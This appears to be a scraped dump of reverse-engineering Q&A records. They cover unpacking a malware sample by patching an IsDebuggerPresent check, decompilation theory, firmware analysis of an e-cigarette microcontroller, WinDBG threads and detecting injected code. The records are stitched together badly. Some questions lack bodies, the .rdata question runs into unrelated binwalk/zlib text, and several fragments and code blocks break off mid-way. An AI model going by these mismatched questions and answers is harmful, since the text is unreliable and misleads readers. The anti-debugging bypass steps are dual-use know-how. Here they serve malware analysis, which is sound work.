<p>This will set a hardware breakpoint that will trigger on read and write. For this particular sample, that causes a problem since the packer obviously needs to read and write that section to unpack.  So once you set the breakpoint, press Ctrl-Alt-B, and edit that breakpoint to only trigger on execute. Btw, you can also do this from the regular disassembly view as well by clicking Window -> Program Segmentation.</p>

<p>I'm not quite sure why your program won't run. I stepped through to the ""IsDebuggerPresent"" check, modified the zero flag(Addr: 0x46BB1F), set the aforementioned hardware breakpoint, and the program ran and unpacked just fine.  It does take a few seconds to unpack though, at least on my box.  Double check your breakpoint settings, and verify that the following options are checked: ""enabled"", ""hardware"", ""break"", ""execute"", and that the address location is 0x401000. If you did this from the segmentation window, then the size should be 0x4A000. (It really doesn't need to be this big).</p>

<p>Here's some more information on breakpoints if you're interested.</p>

"Is it ""theoretically"" possible/impossible to reverse any binary?","2091","","<p>I know that reverse engineering from binary to source code (e.g. C++) is generally considered hard or impossible but has any computer scientist actually proven ""mathematically"" that it's impossible or possible to reverse engineer (any) binary to source code? Is reverse engineering simply a very hard puzzle or are there binary out there that is simply impossible to reverse whether by hand or via decompiler?</p>

<p>NOTE: I know the answer might be ""it depends on platform and programming language"" so I am going to assume the language used is C++ since it's generally considered impossible to reverse it.</p>
","<p>In fact, the answer is a bit subtle. </p>

<p>According to <a href=""http://www.wisdom.weizmann.ac.il/~odedg/p_obfuscate.html"" rel=""noreferrer"">Barak et al.</a>, it is impossible to obfuscate a program. Meaning that you will always leak enough information for an attacker to rebuild a blue-print of the program.</p>

<p>On another hand, it is also impossible to build a program that will automatically reverse-engineering any program given as input (it comes from the <a href=""http://en.wikipedia.org/wiki/Rice%27s_theorem"" rel=""noreferrer"">Rice's theorem</a> as obfuscation used to be built on non-trivial properties that you can find in programs).</p>

<p>So, finally, perfect obfuscation is not possible, but full automation neither. Which means that human (and intuition) is, and will remain, the key of this Science.</p>

"How to recover variables from an assembly code?","2057","","<p>Assuming we have an assembly code, what are the known techniques that could be used to recover the variables used in the original high-level code ?</p>

<p><strong>Edit</strong>: By <em>recovering variables</em>, I do not mean <em>recovering variable names</em>, but trying to identify memory locations that are used to store temporary results that could be replaced by a variable in the high-level code. Also, I am not speaking about bytecodes, but real binary code with no type information, nor complete names embedded in it.</p>
","<p>(I was planning to make it a comment but it turned out rather long and it makes an answer on its own)</p>

<p>Some of the comments mentioned the Hex-Rays decompiler. Its basic ideas are not a trade secret and are in fact described in the <a href=""https://www.hex-rays.com/products/ida/support/ppt/decompilers_and_beyond_white_paper.pdf"">white paper</a> by Ilfak Guilfanov which accompanies <a href=""http://www.youtube.com/watch?v=00EqvVtLdJo"">the presentation</a> he gave in 2008.</p>

<p>I'll paste the relevant part here:</p>

<blockquote>
  <h3>Local variable allocation</h3>
  
  <p>This phase uses the data flow analysis to connect registers from different basic blocks in order to convert
  them into local variables. If a register is defined by a block and
  used by another, then we will create a local variable covering both
  the definition and the use. In other words, a local variable consists
  of all definitions and all uses that can be connected together. While
  the basic idea is simple, things get complicated because of
  byte/word/dword registers.</p>
</blockquote>

<p>It's simple on the surface but of course the implementation has to account for numerous details. And there's always room for improvement. There's this passage:</p>

<blockquote>
  <p>For the time being, we do not analyze live ranges of stack variables
  (this requires first a good alias analysis: we have to be able to
  prove that a stack variable is not modified between two locations). I
  doubt that a full fledged live range analysis will be available for
  stack variables in the near future.</p>
</blockquote>

<p>So, for stack variables the approach right now is simple: each stack slot is considered a single variable for the whole function (with some minor exceptions). The decompiler relies here on the work done by IDA during disassembly, where a stack slot is created for each access by an instruction.</p>

<p>One current issue is multiple names for the same variable. For example, the compiler may cache the stack var in a register, pass it to some function, then later reload it into another register. The decompiler has to be pessimistic here. If we can't prove that the same location contains the same value at two points in time, we can't merge the variables. For example, any time the code passes an address of a variable to a call, the decompiler has to assume the call may spoil anything after that address. So even though the register still contains the same value as the stack var, we can't be 100% certain. Thus the excess of variable names. User can override it with manual mapping, however.</p>

<p>There are some ideas about introducing function annotations that would specify exactly how a function uses and/or changes its arguments (similar to Microsoft's SAL) which would alleviate this problem, but there are some technical implementation issues there.</p>

"Approach to extract useful information from binary file","2052","","<p>The purpose of this question is to gain an understanding of the concepts behind reverse engineering and to understand what approaches may be taken to extract useful information from a binary file.</p>

<p>At this point I am stuck. I'm a newcomer, so I would like to learn how to approach a situation in which I don't get useful information from a tool (like <code>binwalk</code>).

","<h3>General Prerequisites</h3>

<p>When analyzing binaries, it is important to be able to put what is observed into context. For example, how can CPU instructions be differentiated from data in a binary with a non-standard format? This requires some background knowledge of computer systems in general. I would argue that before any attempt at reverse engineering firmware is made, at least basic familiarity with the following concepts is required:</p>

<ul>
<li><p><strong>Computer architecture / computer system organization</strong></p>

<ul>
<li>CPU design and function (e.g. registers, the instruction pointer, memory access)</li>
<li>memory and the memory hierarchy </li>
<li>instruction sets, assembly, opcodes, addressing modes, syntax, mnemonics</li>
<li>information representation (binary, hex, endianness)</li>
</ul></li>
<li><p><strong>Operating system concepts</strong></p>

<ul>
<li>Virtual memory</li>
<li>usermode vs kernelmode, the kernel, the kernel interface (system calls)</li>
<li>process layout in memory - stack, heap, data, instructions</li>
<li>executable formats</li>
<li>application binary interfaces</li>
<li>program entry points</li>
</ul></li>
<li><p><strong>source code to object code transformation</strong></p>

<ul>
<li>compilation, assembly, linking</li>
<li>C/C++ programming</li>
<li>Assembly programming</li>
<li>source-to-assembly construct correlation (e.g. recognition of loop, switch constructs in assembly)</li>
<li>disassembly vs decompilation</li>
</ul></li>
</ul>

<p>My advice is the following:</p>

<ul>
<li>read as much as you can: technical specifications, assembly/disassembly, answers to firmware RE questions, research papers, tutorials, blogs, textbooks, manual pages</li>
<li>emulate/copy the methodologies employed and approaches taken by pros</li>
<li>gain experience as quickly as possible: look at and experiment with many different types of files (executables, image files, compressed files, firmware, etc.), program in assembly to get a feel for it, disassemble many executables</li>
</ul>

<p>Embedded systems often use MIPS or ARM processors, and by extension MIPS or ARM instruction sets. This means that being familiar with MIPS and ARM assembly will be very helpful when analyzing firmware for these systems.</p>

<h1>Analyzing the binary</h1>

<h2>Part 1: Identification of the target device's architecture</h2>

<p>We cannot rely on hearsay to obtain the information required to analyze the firmware. Validity of information about the firmware must be proven by using empirical evidence. It is not enough to have a binary blob from a second-hand source and a processor name from a different question.</p>

<h3>1. Identify the target device</h3>

<p>Fortunately in this case it is easy to at least get the device name: SMOK X Cube II. When the vendor's <a href=""http://www.smoktech.com/support/upgrade/toolsandfirmware"" rel=""nofollow noreferrer"">firmware and tools support page</a> is examined it turns out that there is a real device with that name. The .hex file is bundled with an upgrade tool from <a href=""http://www.nuvoton.com/hq/?__locale=en"" rel=""nofollow noreferrer"">Taiwanese semiconductor manufacturer Nuvoton</a> called ""<a href=""http://www.smoktech.com/support/upgrade/toolsandfirmware/ispxcubeii"" rel=""nofollow noreferrer"">NuMicro ISP Programming Tool</a>"":</p>

<pre><code>~/firmware/e-cig/XCUBE II upgrading tool $ file *
config.ini:                                            ASCII text, with CRLF line terminators
NuMicro ISP Programming Tool.exe:                      PE32 executable (GUI) Intel 80386, for MS Windows
NuMicro ISP Programming Tool User's Guide.pdf:         PDF document, version 1.5
XCUBE II-VIVI-52 (160616)V.1.098(checksum=0x28F9).hex: ASCII text, with CRLF line terminators
</code></pre>

<p>This hex file is straight from the manufacturer of the device processor rather than from a second-hand source. It is also a newer version - v1.098 rather than v1.07. I decided to analyze the older firmware version (v1.07) since this is the version of the binary in the question.</p>

<p><a href=""https://i.stack.imgur.com/zKRh9.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zKRh9.png"" alt=""Upgrade tool pic 1""></a></p>

<h3>2. Identify the processor</h3>

<p>There are some interesting things in the pictures used to describe the upgrade process: the name <strong>NuMicro</strong> and the acronym <strong>ISP</strong> in the tool name, the term <strong>DataFlash</strong>,  a reference to something called <strong>APROM</strong>, and most importantly, the part number: <strong>NUC220LE3AN</strong>. What ""part"" is this a number for? <a href=""http://www.nuvoton.com/hq/products/microcontrollers/arm-cortex-m0-mcus/nuc120-122-123-220-usb-series/nuc220le3an/?__locale=en"" rel=""nofollow noreferrer"">A Nuvoton-developed microcontroller</a> based on ARM's Cortex-M0 processor.</p>

<h3>3. Identify the instruction set architecture</h3>

<p>Nuvoton is kind enough freely share technical documentation for the NuMicro NUC220 series, including the <a href=""http://www.nuvoton.com/resource-files/DS_NUC200_220%28AN%29_EN_Rev1.00.pdf"" rel=""nofollow noreferrer"">datasheet</a> and the <a href=""http://www.nuvoton.com/resource-files/TRM_NUC200_220%28AN%29_Series_EN_V1.02.pdf"" rel=""nofollow noreferrer"">technical reference manual</a>, in addition to various software tools and training materials (click on the ""Resources"" tab at the top of the NUC220LE3AN product page).</p>

<p>From the datasheet, Section 1: ""General Description"", page 7 (emphasis mine):</p>

<blockquote>
  <p>The NuMicro NUC200 Series <strong>32-bit microcontrollers</strong> is embedded with the newest ARM® Cortex™-M0  core with a cost equivalent to traditional 8-bit MCU for industrial control and applications requiring rich communication interfaces. The NuMicro NUC200 Series includes NUC200 and NUC220 product lines. </p>
</blockquote>

<p>Is this enough information to conclude that the code in the firmware binary consist of 32-bit ARM instructions? <strong>No, it is not</strong>. Let us look closely at the functional description of the processor (Chapter 6: Functional Description, section 1: ARM Cortex-M0 Core, page 48):</p>

<p><a href=""https://i.stack.imgur.com/nKdiK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/nKdiK.png"" alt=""Processor functional description""></a>

<p>Let us take special note of the following information:</p>

<ul>
<li><blockquote>
  <p>The  processor can  execute  Thumb  code  and  is  compatible  with  other Cortex®-M profile  processor. </p>
</blockquote></li>
<li><blockquote>
  <p>ARMv6-M Thumb® instruction set</p>
</blockquote></li>
<li><blockquote>
  <p>Thumb-2 technology</p>
</blockquote></li>
</ul>

<p>Note that the processor is an ARM Cortex-M0 Core and not ARM Cortex-M0+ Core, which has a different instruction set.</p>

<p>From ARM's <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0432c/CHDCICDF.html"" rel=""nofollow noreferrer"">Cortex-M0 technical reference manual</a>:</p>

<blockquote>
  <p>The processor implements the ARMv6-M Thumb instruction set, including a number of 32-bit instructions that use Thumb-2 technology. The ARMv6-M instruction set comprises:</p>
  
  <ul>
  <li><p>all of the 16-bit Thumb instructions from ARMv7-M excluding CBZ, CBNZ and IT</p></li>
  <li><p>the 32-bit Thumb instructions BL, DMB, DSB, ISB, MRS and MSR.</p></li>
  </ul>
</blockquote>

<p>What is ""Thumb code"" and the ""Thumb instruction set""?</p>

<p>From ""<a href=""http://www.embedded.com/electronics-blogs/beginner-s-corner/4024632/Introduction-to-ARM-thumb"" rel=""nofollow noreferrer"">Introduction to ARM thumb</a>"" by Joe Lemieux (emphasis mine):</p>

<blockquote>
  <p>The Thumb instruction set consists of <strong>16-bit instructions</strong> that act as
  a compact shorthand for a subset of the 32-bit instructions of the
  standard ARM. Every Thumb instruction could instead be executed via
  the equivalent 32-bit ARM instruction. However, not all ARM
  instructions are available in the Thumb subset; for example, there's
  no way to access status or coprocessor registers. Also, some functions
  that can be accomplished in a single ARM instruction can only be
  simulated with a sequence of Thumb instructions.</p>
  
  <p>At this point, you may ask why have two instruction sets in the same
  CPU? But really the ARM contains only one instruction set: the 32-bit
  set. When it's operating in the Thumb state, the processor simply
  expands the smaller shorthand instructions fetched from memory into
  their 32-bit equivalents.</p>
  
  <p>The difference between two equivalent instructions lies in how the
  instructions are fetched and interpreted prior to execution, not in
  how they function. <strong>Since the expansion from 16-bit to 32-bit
  instruction is accomplished via dedicated hardware within the chip, it
  doesn't slow execution even a bit. But the narrower 16-bit
  instructions do offer memory advantages.</strong></p>
  
  <p>The Thumb instruction set provides most of the functionality required
  in a typical application. Arithmetic and logical operations,
  load/store data movements, and conditional and unconditional branches
  are supported. <strong>Based upon the available instruction set, any code
  written in C could be executed successfully in Thumb state.</strong> However,
  device drivers and exception handlers must often be written at least
  partly in ARM state.</p>
</blockquote>

<p>Here is a good explanation from SO: <a href=""https://stackoverflow.com/questions/28669905/arm-thumb-and-thumb-2-instructions-confusion/28670713#28670713"">ARM, Thumb and Thumb 2 instructions confusion</a></p>

<p>From the <a href=""https://www.scss.tcd.ie/~waldroj/3d1/arm_arm.pdf"" rel=""nofollow noreferrer"">ARMv6-M Architecture Reference Manual</a>, Chapter A5:The Thumb Instruction Set Encoding, section 1: Thumb instruction set encoding, page 82:</p>

<p>To summarize: the code in the firmware binary will consist of little-endian 16-bit ARM Thumb instructions plus a few 32-bit Thumb2 instructions to be executed by a 32-bit ARM Cortex-M0 processor implementing the ARM 16-bit Thumb instruction set with support for Thumb2. </p>

<h3>4. Identify the device's memory layout</h3>

<p>Access to the technical reference manual allows us to determine what APROM and ISP are. From Chapter 6: Functional Description, section 4.4.1: Flash Memory Organization, page 191:</p>

<blockquote>
  <p>The NuMicro NUC200 Series flash memory consists of program memory (APROM), Data Flash, ISP loader program memory (LDROM), and user configuration. Program memory is main memory for  user  applications and called  APROM. User  can write their application to APROM and set system to boot from APROM.</p>
  
  <p>ISP  loader  program  memory  is  designed  for  a  loader  to  implement In-System-Programming function.  LDROM  is  independent  to  APROM  and system  can  also  be  set  to  boot  from  LDROM. Therefore, user can user LDROM to avoid system boot fail when code of APROM was corrupted.</p>
</blockquote>

<p>And from Chapter 6: Functional Description, section 4.4.5: In-System-Programming (ISP), page 199:</p>

<blockquote>
  <p>ISP provides the ability to update system firmware on board. Various peripheral interfaces let ISP loader in LDROM to receive new program code easily. The most common method to perform ISP is  via  UART  along  with  the ISP  loader in  LDROM.  General  speaking,  PC  transfers  the  new APROM  code  through  serial  port.  Then ISP  loader receives  it  and  re-programs  into  APROM through ISP commands.</p>
</blockquote>

<p>According to the information in the <code>config.ini</code> file bundled with the NuMicro ISP Programming Tool, flash memory size of the APROM segment is 128 KB:</p>

<pre><code>$ cat config.ini | grep NUC200LE3AN -B2 -A3

[0x00020000]
NAME_STRING = NUC200LE3AN
RAM_SIZE = 16
FLASH_SIZE = 128
</code></pre>

<p>Here is a diagram of the flash memory address map:</p>

<p><a href=""https://i.stack.imgur.com/okKY3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/okKY3.png"" alt=""flash memory address map""></a></p>

<p>We know that the space from 0x0000_0000 to 0x0001_FFFF = 131071 bytes, which is 128 KB, and this is the region to which the binary from the hex file will be flashed to using the upgrade tool. Above that there is a block of memory from 0x0002_0000 to 0x0010_000 which is labeled ""Reserved for Further Used"". The size of this ""Reserved"" space is 0x0010_0000 - 0x0002_0000 = 0xE0000, or 917504 bytes. This is almost 1 megabyte of reserved space. The 128 KB reserved for APROM makes up 12.5% of the address space between 0x0000_0000 and 0x0010_0000, but is represented as being larger than the ~1 MB ""Reserved"" block. This is very strange. There is also no documentation of this reserved block anywhere in the technical reference manual that I could find. If one had physical access to the device, perhaps the contents of flash memory could be dumped and analyzed to find out what lies in this region.</p>

<p>Since the firmware binary is written to space in flash memory reserved for user applications, it seems unlikely that the firmware binary contains kernel code, bootloader code or a filesystem. This is different from router firmware, which tends to at the very least contain kernel code.</p>

<h2>Part 2: Direct analysis of the binary</h2>

<p>Quick recap of what we know at this point:</p>

<ul>
<li>The device name - SMOK X Cube II </li>
<li>The processor - A NuMicro NUC220LE3AN processor, based on an ARM Cortex-M0 Core processor</li>
<li>The instruction set architecture - little-endian ARM-v6 M 16-bit Thumb</li>
<li>The location in flash memory to which the firmware will be written - the 128KB APROM region for user applications (in other words, not the kernel)</li>
<li>NuMicro is a Taiwan-based company. We will see why this is potentially relevant shortly.</li>
<li>The entropy plot generated by <code>binwalk</code>  included in the question reveals that there are no encrypted or compressed regions in the firmware</li>
<li>Based on information included in the question, there exist ASCII strings embedded in the file that appear to be related to the functionality of the device </li>
</ul>

<p>Potential complications:</p>

<ul>
<li>firmware binaries do not have a standard format like executable binaries do</li>
<li>Data may be intermingled with code/instructions within the binary. If this is the case, it is possible that data such as strings will be disassembled as instructions, resulting in an incorrect representation of the firmware's code</li>
</ul>

<h3>Preliminary analysis</h3>

<p><strong>1. <code>strings</code> and <code>hexdump</code></strong></p>

<p>The output of strings can be used to quick heuristic in determining if the firmware is encrypted/compressed. If there are no strings in the output, it is a good indicator that the entire file is obfuscated somehow. <code>hexdump</code> with the -C argument can be used to provide some context for the strings i.e. where in the binary they are relative to code and relative to each other. In other words, are the strings packed together in a single block, or are they scattered throughout the binary? The answer can provide clues about the layout of the firmware.</p>

<p>Using <code>hexump</code>, we see that the ASCII strings are intermingled with what might be code:</p>

<p>There are several more such clusters of ASCII strings in different parts of the file. Some of the ASCII strings are mentioned in the <a href=""http://7xjcby.com2.z0.glb.qiniucdn.com/file/14649402661940c5xxzme3pi4quxr.png"" rel=""nofollow noreferrer"">product manual</a>:</p>

<p><a href=""https://i.stack.imgur.com/9yJuK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/9yJuK.png"" alt=""binary visualization by byteclass""></a></p>

<p><strong>2. Taking the locale the firmware was developed in into consideration</strong></p>

<p>The firmware, the upgrade tool and the microcontroller are all developed by Nuvoton, a Taiwanese company. Perhaps there are sequences of traditional Chinese characters in the binary as well.</p>

<p>By default, <code>strings</code> searches for ASCII character sequences and the -C option for <code>hexdump</code> prints bytes within the ASII range as ASCII characters. But what if there are <a href=""https://docs.python.org/3/howto/unicode.html"" rel=""nofollow noreferrer"">Unicode</a>-encoded strings in the binary in addition to ASCII-encoded strings? Radare2 can be used to search for strings in the hex file directly, rather than relying on the output of a different tool (<a href=""https://www.suse.com/communities/blog/making-sense-hexdump/"" rel=""nofollow noreferrer"">hexdump is pretty flexible</a> but it is faster to use radare2). To search for strings, the <a href=""https://github.com/pwntester/cheatsheets/blob/master/radare2.md"" rel=""nofollow noreferrer""><code>izz</code></a> commands will be used to search for strings throughout the binary:</p>

<pre><code>$ r2 ihex://SMOK_X_CUBE_II_firmware_v1.07.hex
 -- I am Pentium of Borg. Division is futile. You will be approximated.
[0x00000000]&gt; izz
Do you want to print 1444 lines? (y/N)   &lt;--- enter ""y"", obviously

<p>I cannot read these characters, so I do not know what language they are from. Maybe it is just gibberish.</p>

<p><strong>3. Using a hex editor</strong></p>

<p>A <a href=""http://home.gna.org/bless/"" rel=""nofollow noreferrer"">hex editor with a GUI</a> can be used to quickly search for patterns in the data. For example, the byte <code>0A</code> looks like it is used as a terminating character for ASCII strings:</p>

<p><a href=""https://i.stack.imgur.com/QUDZQ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/QUDZQ.png"" alt=""0A ASCII string terminating character""></a></p>

<h3>Disassembly</h3>

<p>So how should the binary be disassembled using r2? Are any there any special arguments or commands for 16-bit ARM Thumb instructions + some 32-bit Thumb2 instructions? </p>

<p>From <a href=""https://github.com/radare/radare2/issues/3433"" rel=""nofollow noreferrer"">How to disassemble to ARM UAL?</a>:</p>

<blockquote>
  <p>-b16 is asumed for thumb, not because the instruction size or the register size. Its an exception to make things simpler. Because its
  just a mode of the cpu.</p>
  
  <p>-b16 sets thumb2 mode in capstone disassembler (as well as in gnu). Thumb2 contains 2 byte and 4 byte instruction lengths. Thumb was only
  2. But thumb and thumb2 are binarynl compatible, so it makes sense to use thumb2 here, unless the cpu doesnt supports it.</p>
  
  <p>From what i understand from ual is that this ist just a syntax, and
  this symtax should be ready in capstone.</p>
  
  <p>Capstone knows nothing about code or data. It just disassembles.</p>
</blockquote>

<p>In order to properly disassemble the file, it is critical that the correct architecture is specified:</p>

<blockquote>
  <p>-b bits     force asm.bits (16, 32, 64)</p>
</blockquote>

<p>For this firmware binary, <code>-b 16</code> should be used, <strong>not <code>-b 32</code></strong>: </p>

<p><code>$ r2 -a arm -b 16 ihex://SMOK_X_CUBE_II_firmware_v1.07.hex</code>  </p>

<p>If <code>-b 32</code> is used, the result is quite a bit of byte sequences r2 reads as invalid due to misalignment:
<a href=""https://i.stack.imgur.com/nibzc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/nibzc.png"" alt=""invalid disassembly""></a></p>

<p>For reference, here is disassembly beginning at the same offset, <code>0x1e8</code>, with proper 16-bit alignment:</p>

<p><a href=""https://i.stack.imgur.com/yx854.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yx854.png"" alt=""less invalid disassembly""></a></p>

<p>Obviously this is totally different.</p>

<p>It is important to emphasize that the entire binary will be disassembled as executable code, including data such as the ASCII and Unicode byte sequences. This must be taken into consideration when analyzing the disassembled output. </p>

<p>To analyze the disassembled code, one must be familiar with ARM assembly.</p>

<h3>Additional Considerations</h3>

<ul>
<li>The ISP upgrade tool is a MS Windows PE32 executable binary. This can be reverse engineered to determine how the flashing process takes place.</li>
<li>Physical access to the microcontroller could be useful. The entire contents of flash memory could be dumped and analyzed. This would also enable one to see exactly how everything is laid out in flash memory</li>
<li>if known good blocks of code can be isolated, it my be possible to decompile it</li>
</ul>

<h1>Conclusion</h1>

<p>Hopefully the approach used here proves useful for your future firmware RE endeavors. Analyzing firmware poses its own set of challenges because of the close relationship between it and it the hardware it is designed to be embedded in. Since the design and architecture of the device determines the layout and content of firmware, firmware sometimes cannot be reversed without access to the device, or at the very least knowing the instruction set architecture of the device.</p>

What type does it return?
How do I explicitly call it from C++, something in the <code>operator+(a,b)</code> style?</p>

<p>(I know that it is possible to define <code>operator new</code> in a class, but this looks a bit different.)</p>
","<p>A runtime function does not necessarily convert to a C++ function. For example, on a processor that has no floating point hardware, a simple statement like</p>

<pre><code>a=b+c;

<p>with <code>a</code>, <code>b</code> and <code>c</code> being floats, will probably be converted to a function call that takes <code>b</code> and <code>c</code> as parameters and returns the results. The user is not supposed to call that function directly.</p>

<p>In your case, consider that every <code>new</code> probably maps to something that allocates memory and calls a constructor function, and every <code>new[]</code> allocates memory for several elements and calls a constructor function on each element. The <code>new</code> <code>_Znwj</code> function is the memory allocator used internally by the <code>new</code> operator (at least if you're using <code>gcc</code>, which I assume), and it's not intended to be called directly from C++.</p>

<p>So, you see that the <code>_Znwj</code> resp. <code>_Znaj</code> are the allocator functions for a single class resp. an array of classes, both of them take the number of bytes required as parameter, and both of them return a pointer to the allocated memory as result.</p>

<p>To answer your questions:</p>

<ol>
<li><p><strong>What does that operator <code>new</code> do ?</strong></p>

<p>It allocates memory for a new class instance.</p></li>
<li><p><strong>Is it <code>new</code> or <code>new[]</code> ?</strong></p>

<p><code>_Znwj</code> is <code>new</code>, and <code>_Znaj</code> is <code>new[]</code>.</p></li>
<li><p><strong>What type does it return ?</strong></p>

<p>It returns the address of the newly allocated memory block. In C++, the closest match to resemble that would be a <code>void *</code>, but note it's supposed to point to a class structure.</p></li>
<li><p><strong>How do I explicitly call it from C++, something in the <code>operator+(a,b)</code> style ?</strong></p>

<p>You're not supposed to do that. You use <code>new</code> or <code>new[]</code>. I assume the makers of <code>gcc</code> explicitly used a function name that cannot, normally, be called from a C++ program without a syntax error due to the name conflict.</p></li>

"tools - Free Windows Memory Toolkit for x64","2028","","<p>I have seen the Moonsols Memory Toolkit for Windows (Community Edition). It however does not support x64 memory dumping. Only its professional version can do that. Are there any free alternatives out there that do the same ? To narrow down what I am looking for I would be interested in features like -:</p>

<ul>
<li><p>Convert a memory dump from a x64 Architecture.</p></li>
<li><p>Convert or decompress Windows 7 hibernation files.</p></li>
<li>Convert a Windows 7 memory dump.</li>

"Unpacking a program which seems to be not packed?","2024","","<p>I have downloaded a sample of a malware to analyze it. First, I opened it with PEiD to look if it is packed. 
PEiD gives me the following information:</p>

<pre><code>   Microsoft Visual Basic 5.0/6.0
</code></pre>

<p>So, I assumed that it is not packed. 
When I opened it using ollydbg shows me the following lines:</p>

<pre><code>   PUSH malware.00401F8C
   CALL &lt;JMP.&amp;MSVBVM60.#100&gt;
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   INC EAX
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   ADD BYTE PTR DS:[EAX],AL
   DB 00
   DB 1D
   ....
   ....
</code></pre>

<p>So, normally it should start with a function prologue(the typical beginning line with PUSH EBP and so on) but although it is not packed, obviously the program tries to make the analyzing process harder (for me). 
When I step to the second line( CALL &lt;...>), then the process begins to run and does not stop. In my previous cases, I have only unpacked malware samples that were packed with UPX. So, a piece of code like that above is completely new for me. So:</p>

<p>How should I solve this? Can someone give me an advice how I can handle that?</p>

"PE .rdata section contents","2010","","<p>According to MSDN, the <code>.rdata</code> section of a PE should contain the debug directory and the description string.

Can someone please clarify the purpose of <code>.rdata</code> and why what I find in there disagrees with both descriptions? Also, shouldn't the import information be in <code>.idata</code>?</p>

<p>This creates two files <code>14C33</code> which, when running binwalk, gives no results and <code>C4FBF</code> which gives a similar output as <code>binwalk TDW8961N</code>. It also creates lots of xml files which are similar. </p>

<p>I did the same thing with the file <code>C4FBF</code> and when I try to decompress it, it fails. Using gzip, I get <code>unknown suffix -- ignored</code>. I also tried with uncompress and pigz, but they gave similar errors.</p>

<p>Is there something wrong with the <code>zlib compressed data</code>, is <code>file</code> giving a false positive or is there a custom compression algorithm?

"Three threads in Windows","2002","","<p>I wrote a little program which just shows a dialog. Basically an ASM Hello World. When the dialog is displayed and I break in WinDBG, I can see three threads even though the application doesn't use any threads at all.</p>

<p>I was not aware that there is something like default threads applied to a process, or is this because of WinDBG?</p>

<p>The Process/Thread window shows</p>

<pre><code> 000:13d4:MyApp.exe
    000:d14
    001:11bc
    002:50c

<p>If I put a memory access breakpoint and the process would have multiple threads, do I have to specify in which thread this should be triggered. I think this shouldn't matter right? So if an address is accessed by any thread, the breakpoint should trigger regardless.</p>

<p><strong>udate</strong></p>

<p>So I took now a closer look (the handle numbers have changed, but the IDs are relevant anyway). I'm Running Windows 7-32bit-x86 if that helps.</p>

<p><code>000:</code> refers to my original process, but this was already known.</p>

<p><code>001:</code> Stacktrace when I break looks like this (some thread snychronization required by WinDBG?):</p>

ntdll!RtlInitializeExceptionChain+0xef
ntdll!RtlInitializeExceptionChain+0xc2
</code></pre>

<p>It seems that this thread belongs to some <code>msiltcfg.dll</code> which would be a Windows 7 DLL, but why does it cread threads in my process?</p>

<p><code>002:</code> So this would probably be the WinDBG thread which Akira32 refers to in his answer, right? (why does WinDBG need a thread of his own?).</p>

","<p>By your description:</p>

<p>Yes, your program should have only one thread running, without debuger. You can check this on task manager.
However when you attach to windbg it will create a thread on break. 
The third thread that you mention, i really dont have a clue. Maybe a injected dll running code... </p>

<p>But you can try to find out by opening the windows ""call stack"" on winbgd. (and selecting each thread, on thread window)</p>

<ul>
<li>You will see you code's thread, with last function call on top.</li>
<li>Windbg thread , probably with the function ntdll!DbgBreakPoint on top.    </li>
<li>The third one, see where it stops and what dll the code    belongs on dissambly window.</li>
</ul>

<p>You are right. You just need to set a breakpoint any thread will trigger on acess :).</p>

<p>The windbg creates that thread every time you pause the attached process execution. It makes sense because the windbg needs a breakpoint to stop the execution, since he dont know where to patch a normal breakpoint on the code, to break immediately. He creates a thread to call dbgbreakpoint and break.</p>

<p>If you continue the execution, the windbg's thread will terminate. This is a normal behavior of the debuggers, not only windbg.</p>

<pre><code>001:

<p>The msiltcfg.dll has functions to handle MSI installers. ""Windows Installer Configuration API Stub""
Its strange,for me, that the process has this dll loaded. By the stack call you show, its waiting for something. A thread, mutex event, etc... This thread has nothing to do with windbg. Something has loaded that dll on your process and created the thread. Almost for sure it is a operating system process.</p>

<p>One thing you can do is check if other processes (calc.exe or notpad.exe, simple ones) got the same thread or the same dll loaded. Some programs/OS can load dll's on abritary processes or even all and run code (using the WIN32 API function CreateRemoteThread). This is a normal behavior done by malware too :). </p>

<p>One thing you have for sure is that your program has only created one thread. And in a normal situation it should not have more than one.</p>

<p>I tested a program like your to be sure, and just got a thread.</p>

"Can a Windows process check if it has been injected by another process?","2001","","<p>There are many tutorials which show how to detect injected code into process memory. However, this generally requires using a debugger. </p>

<p>Is it possible for a process to somehow detect if it has been injected by another process using winapi? If so, how?</p>

<p>More specifically, are there any ""fixed/likely"" characteristics of injected code? For instance, from <a href=""https://reverseengineering.stackexchange.com/questions/3482/does-code-injected-into-process-memory-always-belong-to-a-page-with-rwx-access"">this question</a> it appears that injected code can be characterized by always appearing in pages that have the following protection flags set: PAGE_READWRITE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY and possibly (but unlikely) PAGE_EXECUTE. Can you point out other characteristics of injected code?</p>
","<p>Injected code could represented by, but not limited to:</p>

<p><strong>Remotely created thread</strong> could be detected by several techniques:</p>

<ol>
<li>Periodically check if process threads were created by current process using <code>NtQueryProcessInformation</code>.</li>
<li><p>For each thread check if it is running from the address space of the original executable and not from some orphaned memory page:</p>

<ol start=""3"">
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684283%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><code>NtQueryInformationThread</code></a></li>
<li>Set second parameter to <code>ThreadQuerySetWin32StartAddress</code></li>
<li><code>GetModuleInformation</code> - check if the thread starting address is in the range of each of the loaded modules and those modules are legit (by known list/by path).</li>
<li>Check <a href=""https://stackoverflow.com/questions/10887866/how-to-retrieve-start-address-of-a-thread-using-its-id"">here</a> too.</li>
</ol></li>
<li><p>Monitor thread creating API inside current process and also check if the creating PID belong to current process - <code>NtQueryProcessInformation</code>, <code>CreateToolhelp32Snapshot</code>.</p></li>
<li>Monitor memory protection APIs (<code>VirtualProtect</code>) to detect if someone tries to modify your code and then check if that ""someone"" belongs to legit process address space.</li>
<li>By keeping the list of legit loaded modules, one also can check if each thread in process belong to address space of a legit module from the list.</li>
